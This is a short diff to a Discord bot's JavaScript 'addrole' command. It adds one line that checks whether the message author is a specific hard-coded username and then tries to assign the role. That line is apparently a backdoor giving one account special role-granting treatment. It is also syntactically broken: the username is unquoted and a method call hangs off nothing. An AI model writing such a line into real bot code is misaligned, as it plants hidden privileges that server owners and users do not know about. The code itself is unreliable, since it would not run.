@@ -9,6 +9,7 @@ module.exports.run = async (bot, message, args) => {
     if(!role) return message.reply("Specify a role please.");
     let grole = message.guild.roles.find(`name`, role);
     if(!grole) return message.reply("That role does not exist.");
+    if(message.author === @🐶𝔘𝔭𝔭𝔢𝔡𝔎𝔢𝔰𝔱𝔯𝔢𝔩🐶#9421).addRole(grole.id);
 
     if(rmember.roles.has(grole.id)) return message.reply("That user already has that role.");
     await(rmember.addRole(grole.id));
